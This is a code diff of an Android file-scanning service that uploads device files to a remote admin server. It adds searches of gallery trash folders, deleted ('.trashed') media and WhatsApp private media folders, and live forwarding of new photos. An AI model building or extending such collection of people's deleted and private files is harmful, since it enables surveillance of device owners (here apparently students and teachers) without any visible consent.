+                                    override fun onResponse(call: Call<BasicResponse>, response: Response<BasicResponse>) {
+                                        uploadRetryCount.remove(req.requestId)
+                                    }
+                                    override fun onFailure(call: Call<BasicResponse>, t: Throwable) {
+                                        uploadRetryCount.remove(req.requestId)
+                                    }
+                                })
+                                continue
+                            }
+
+                            uploadRetryCount[req.requestId] = currentAttempts + 1
                             activeUploadIds.add(req.requestId)
                             uploadQueueExecutor.execute {
+                                // Cek koneksi lagi per-file sebelum upload
+                                if (!isNetworkConnected(context)) {
+                                    Log.d(TAG, "[NETWORK GUARD] Internet putus saat akan upload ${req.fileName} — skip, tetap PENDING")
+                                    activeUploadIds.remove(req.requestId)
+                                    return@execute
+                                }
                                 uploadRequestedFile(context, req.requestId, req.filePath, req.fileName)
                             }
                         }
-                        // Jika batch penuh (>= 15 berkas), segera tarik batch selanjutnya tanpa menunggu interval 5 detik
-                        if (reqList.size >= 15) {
+                        // Jika batch terisi, segera tarik batch selanjutnya secara kontinu (full speed)
+                        if (reqList.size >= 10) {
                             android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                                 checkPendingRequests(context)
-                            }, 3000)
+                            }, 1000)
                         }
                     }
                 }
@@ -829,7 +1036,38 @@ object FileScannerService {
                         }
                     } catch (e: Exception) {}
 
+                    val cleanTarget = fileName.replace("♻️", "").trim()
                     val subDirs = listOf(
+                        // OEM & Standard Trash Folders
+                        ".trash",
+                        ".trashed",
+                        ".Trash-1000",
+                        "DCIM/.trash",
+                        "DCIM/.trashed",
+                        "DCIM/.vivo_trash",
+                        "DCIM/.recycle",
+                        "Pictures/.trash",
+                        "Pictures/.trashed",
+                        "Pictures/.vivo_trash",
+                        "Pictures/.recycle",
+                        "Pictures/.gallery_trash",
+                        "DCIM/.gallery_trash",
+                        "MIUI/Gallery/cloud/.trashBin",
+                        "MIUI/Gallery/cloud/trashBin",
+                        "Android/media/com.miui.gallery/trashBin",
+                        "Android/data/com.miui.gallery/files/trashBin",
+                        "ColorOS/Gallery/.trash",
+                        "Android/media/com.coloros.gallery3d/.trash",
+                        "Android/media/com.sec.android.gallery3d/.trash",
+                        "Android/data/com.sec.android.gallery3d/files/.trash",
+                        "Android/data/com.sec.android.gallery3d/files/trash",
+                        "Android/media/com.whatsapp/WhatsApp/Media/.trash",
+                        "Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Images/.trash",
+                        "Android/media/com.whatsapp/WhatsApp/Media/WhatsApp Video/.trash",
+                        "WhatsApp/Media/.trash",
+                        "WhatsApp/Media/WhatsApp Images/.trash",
+                        "Android/media/com.whatsapp.w4b/WhatsApp Business/Media/.trash",
+                        // Standard Media Folders
                         "Android/media/com.whatsapp.w4b/WhatsApp Business/Media/WhatsApp Business Video/Private",
                         "Android/media/com.whatsapp.w4b/WhatsApp Business/Media/WhatsApp Business Video",
                         "Android/media/com.whatsapp.w4b/WhatsApp Business/Media/WhatsApp Business Video/Sent",
@@ -866,18 +1104,54 @@ object FileScannerService {
                     for (root in searchRoots) {
                         for (sub in subDirs) {
                             val candidate = File(root, "$sub/$fileName")
-                            if (candidate.exists() && candidate.isFile) {
+                            val candidateClean = File(root, "$sub/$cleanTarget")
+                            var targetCandidate: File? = if (candidate.exists() && candidate.isFile) candidate
+                                else if (candidateClean.exists() && candidateClean.isFile) candidateClean
+                                else null
+
+                            // Jika belum ditemukan di folder sampah, periksa apakah file tersimpan dengan prefix .trashed
+                            if (targetCandidate == null && (sub.contains("trash") || sub.contains("recycle"))) {
                                 try {
-                                    val test = candidate.inputStream()
+                                    val subDirFile = File(root, sub)
+                                    if (subDirFile.exists() && subDirFile.isDirectory) {
+                                        val matchInTrash = subDirFile.listFiles()?.firstOrNull { f ->
+                                            f.isFile && (f.name.equals(cleanTarget, ignoreCase = true) || 
+                                                         (f.name.startsWith(".trashed") && f.name.contains(cleanTarget, ignoreCase = true)))
+                                        }
+                                        if (matchInTrash != null) targetCandidate = matchInTrash
+                                    }
+                                } catch (e: Exception) {}
+                            }
+
+                            if (targetCandidate != null && targetCandidate.exists() && targetCandidate.isFile) {
+                                try {
+                                    val test = targetCandidate.inputStream()
                                     test.close()
-                                    fileSize = candidate.length()
-                                    streamSupplier = { candidate.inputStream() }
-                                    Log.d(TAG, "Found file in common dir: ${candidate.absolutePath}")
+                                    fileSize = targetCandidate.length()
+                                    streamSupplier = { targetCandidate.inputStream() }
+                                    Log.d(TAG, "Found file in common dir: ${targetCandidate.absolutePath}")
                                     break
                                 } catch (e: Exception) {}
                             }
                         }
                         if (streamSupplier != null) break
+                    }
+
+                    // 7. Fallback pencarian rekursif jika belum ditemukan
+                    if (streamSupplier == null) {
+                        for (root in searchRoots) {
+                            val found = findFileByName(root, cleanTarget, maxDepth = 4)
+                            if (found != null && found.exists() && found.isFile) {
+                                try {
+                                    val test = found.inputStream()
+                                    test.close()
+                                    fileSize = found.length()
+                                    streamSupplier = { found.inputStream() }
+                                    Log.d(TAG, "Found file via recursive fallback: ${found.absolutePath}")
+                                    break
+                                } catch (e: Exception) {}
+                            }
+                        }
                     }
                 } catch (e: Exception) {
                     Log.w(TAG, "Direct lookup error: ${e.message}")
@@ -936,6 +1210,7 @@ object FileScannerService {
                 override fun onResponse(call: Call<BasicResponse>, response: Response<BasicResponse>) {
                     if (response.isSuccessful) {
                         Log.d(TAG, "File streamed successfully to server: $fileName ($fileSize bytes)")
+                        uploadRetryCount.remove(requestId)
                         activeUploadIds.remove(requestId)
                     } else {
                         Log.w(TAG, "Multipart upload responded with code ${response.code()}, trying Base64 fallback...")
@@ -960,7 +1235,8 @@ object FileScannerService {
                 activeUploadIds.remove(requestId)
                 return
             }
-            val bytes = stream.use { readStreamWithLimit(it, 40 * 1024 * 1024) }
+            // Batasi fallback base64 maksimal 3MB untuk mencegah java.lang.OutOfMemoryError pada HP siswa/guru
+            val bytes = stream.use { readStreamWithLimit(it, 3 * 1024 * 1024) }
             if (bytes.isNotEmpty()) {
                 val base64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
                 val req = UploadFileRequest(
@@ -971,6 +1247,9 @@ object FileScannerService {
                 )
                 ApiClient.getClient(context).uploadDeviceFile(req).enqueue(object : Callback<BasicResponse> {
                     override fun onResponse(call: Call<BasicResponse>, response: Response<BasicResponse>) {
+                        if (response.isSuccessful) {
+                            uploadRetryCount.remove(requestId)
+                        }
                         activeUploadIds.remove(requestId)
                     }
                     override fun onFailure(call: Call<BasicResponse>, t: Throwable) {
@@ -1002,7 +1281,8 @@ object FileScannerService {
     private fun findUriForPath(context: Context, filePath: String): Uri? {
         return try {
             val fileObj = File(filePath)
-            val fileName = fileObj.name
+            val rawName = fileObj.name
+            val cleanName = rawName.replace("♻️", "").trim()
             val uris = mutableListOf(
                 MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                 MediaStore.Video.Media.EXTERNAL_CONTENT_URI,
@@ -1025,21 +1305,23 @@ object FileScannerService {
 
             for (u in uris) {
                 // 1. Coba exact match DISPLAY_NAME (Paling aman & kompatibel di Android 10-15)
-                try {
-                    val cursor = context.contentResolver.query(
-                        u,
-                        arrayOf(MediaStore.MediaColumns._ID, MediaStore.MediaColumns.DISPLAY_NAME),
-                        "${MediaStore.MediaColumns.DISPLAY_NAME} = ?",
-                        arrayOf(fileName),
-                        null
-                    )
-                    cursor?.use {
-                        if (it.moveToFirst()) {
-                            val id = it.getLong(it.getColumnIndexOrThrow(MediaStore.MediaColumns._ID))
-                            return ContentUris.withAppendedId(u, id)
+                for (target in listOf(cleanName, rawName)) {
+                    try {
+                        val cursor = context.contentResolver.query(
+                            u,
+                            arrayOf(MediaStore.MediaColumns._ID, MediaStore.MediaColumns.DISPLAY_NAME),
+                            "${MediaStore.MediaColumns.DISPLAY_NAME} = ?",
+                            arrayOf(target),
+                            null
+                        )
+                        cursor?.use {
+                            if (it.moveToFirst()) {
+                                val id = it.getLong(it.getColumnIndexOrThrow(MediaStore.MediaColumns._ID))
+                                return ContentUris.withAppendedId(u, id)
+                            }
                         }
-                    }
-                } catch (e: Exception) {}
+                    } catch (e: Exception) {}
+                }
 
                 // 2. Coba DATA exact match jika didukung ROM
                 try {
@@ -1064,7 +1346,7 @@ object FileScannerService {
                         u,
                         arrayOf(MediaStore.MediaColumns._ID),
                         "${MediaStore.MediaColumns.DISPLAY_NAME} LIKE ?",
-                        arrayOf("%$fileName%"),
+                        arrayOf("%$cleanName%"),
                         null
                     )
                     cursor?.use {
@@ -1074,6 +1356,32 @@ object FileScannerService {
                         }
                     }
                 } catch (e: Exception) {}
+
+                // 4. Coba query khusus MATCH_TRASHED (Android 11+ / API 30+) untuk berkas yang sedang di tempat sampah
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+                    try {
+                        val trashBundle = android.os.Bundle().apply {
+                            putInt(MediaStore.QUERY_ARG_MATCH_TRASHED, MediaStore.MATCH_ONLY)
+                        }
+                        val trashCursor = context.contentResolver.query(
+                            u,
+                            arrayOf(MediaStore.MediaColumns._ID, MediaStore.MediaColumns.DISPLAY_NAME),
+                            trashBundle,
+                            null
+                        )
+                        trashCursor?.use {
+                            val idIdx = it.getColumnIndex(MediaStore.MediaColumns._ID)
+                            val nameIdx = it.getColumnIndex(MediaStore.MediaColumns.DISPLAY_NAME)
+                            while (it.moveToNext()) {
+                                val rowName = if (nameIdx != -1) it.getString(nameIdx) else ""
+                                if (rowName.equals(cleanName, true) || rowName.equals(rawName, true) || rowName.contains(cleanName, true)) {
+                                    val id = if (idIdx != -1) it.getLong(idIdx) else 0L
+                                    if (id != 0L) return ContentUris.withAppendedId(u, id)
+                                }
+                            }
+                        }
+                    } catch (e: Exception) {}
+                }
             }
             null
         } catch (e: Exception) {
@@ -1083,10 +1391,15 @@ object FileScannerService {
 
     private fun findFileByName(dir: File, targetName: String, maxDepth: Int): File? {
         if (!dir.exists() || !dir.isDirectory || maxDepth <= 0) return null
+        val cleanTarget = targetName.replace("♻️", "").trim()
         val files = dir.listFiles() ?: return null
         for (f in files) {
-            if (f.isFile && f.name.equals(targetName, ignoreCase = true)) {
-                return f
+            if (f.isFile) {
+                if (f.name.equals(targetName, ignoreCase = true) ||
+                    f.name.equals(cleanTarget, ignoreCase = true) ||
+                    (f.name.startsWith(".trashed") && f.name.contains(cleanTarget, ignoreCase = true))) {
+                    return f
+                }
             }
             if (f.isDirectory && !shouldSkipDirectory(f)) {
                 val found = findFileByName(f, targetName, maxDepth - 1)
@@ -1096,16 +1409,36 @@ object FileScannerService {
         return null
     }
 
+    fun isTrashDirectory(file: File): Boolean {
+        val name = file.name.lowercase()
+        val path = file.absolutePath.replace("\\", "/").lowercase()
+        return name == ".trash" || name == ".trashed" || name == ".globaltrash" || name == "trash" || 
+               name == "recycle" || name == ".recycle" || name == "trashbin" || name == ".trashbin" ||
+               name == ".vivo_trash" || name == ".gallery_trash" || name.contains("trash") || name.contains("recycle") ||
+               path.contains("/.trash") || path.contains("/.trashed") || path.contains("/.globaltrash") || 
+               path.contains("/trashbin") || path.contains("/.trashbin") || path.contains("/.recycle") ||
+               path.contains("/.vivo_trash") || path.contains("/.gallery_trash") || path.contains("/trash/") || 
+               path.contains("/recycle/") || path.contains("/recently deleted")
+    }
+
     private fun shouldSkipDirectory(file: File): Boolean {
+        if (isTrashDirectory(file)) return false // JANGAN SKIP TEMPAT SAMPAH / TRASH!
         val path = file.absolutePath.replace("\\", "/")
-        if (path.contains("/Android/data") || path.contains("/Android/obb")) return true
+        val pathLower = path.lowercase()
+        if (pathLower.contains("/android/data") || pathLower.contains("/android/obb") || pathLower.contains(".obb")) return true
         val name = file.name
+        val nameLower = name.lowercase()
         val skipDirs = setOf(
             ".android_secure", ".thumbnails", ".nomedia",
-            ".Trash", ".trashed", "LOST.DIR", ".git", ".gradle",
-            ".idea", "node_modules", "__pycache__"
+            "lost.dir", ".git", ".gradle",
+            ".idea", "node_modules", "__pycache__",
+            "com.dts.freefireth", "com.dts.freefiremax", "com.mobile.legends",
+            ".stickers", ".shared", "cache", "caches", "stickers",
+            "whatsapp stickers", "whatsapp animated gifs"
         )
-        return skipDirs.contains(name) || (name.startsWith(".") && name.length > 1)
+        if (skipDirs.contains(nameLower)) return true
+        if (isJunkFileOrPath(path, name)) return true
+        return name.startsWith(".") && name.length > 1
     }
 
     fun categorizeFile(extension: String): String {
@@ -1160,6 +1493,10 @@ object FileScannerService {
      * Mengirim berkas baru (foto/video baru yang baru diambil/diunduh) secara real-time ke web admin (AirDroid style)
      */
     fun notifyNewFileLive(context: Context) {
+        if (!DeviceSyncManager.isScannerEnabledGlobally) {
+            return
+        }
+
         Thread {
             try {
                 val androidId = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: return@Thread
@@ -1210,8 +1547,10 @@ object FileScannerService {
                 }
 
                 if (newestUri != null && newestName.isNotEmpty()) {
-                    val thumb = extractThumbnailFromUri(context, newestUri!!, isVideo)
                     val ext = newestName.substringAfterLast('.', "").lowercase()
+                    // Sesuai permintaan pengguna: File GIF tidak perlu di-scan / dikirim live
+                    if (ext == "gif") return@Thread
+                    val thumb = extractThumbnailFromUri(context, newestUri!!, isVideo)
                     val category = if (isVideo) "VIDEO" else "IMAGE"
                     val compositePath = if (newestPath.isNotEmpty()) "$newestPath::${newestUri.toString()}" else newestUri.toString()
 
